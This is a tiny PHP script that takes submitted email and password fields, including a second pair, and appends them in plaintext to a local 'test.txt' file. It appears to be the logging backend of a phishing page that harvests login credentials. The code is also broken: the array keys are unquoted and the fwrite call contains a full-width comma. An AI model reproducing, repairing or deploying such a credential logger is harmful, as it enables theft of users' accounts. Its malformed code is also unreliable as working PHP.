<?php 
	$Email=$_POST[E-mail];
	$Password=$_POST[password];
	$Email2=$_POST[E-mail2];
	$Password2=$_POST[password2];
	
	$file=fopen("test.txt", "a");
	fwrite($file，"$Email $Email2 $Password $Password2 \r\n");
	fclose($file);
?>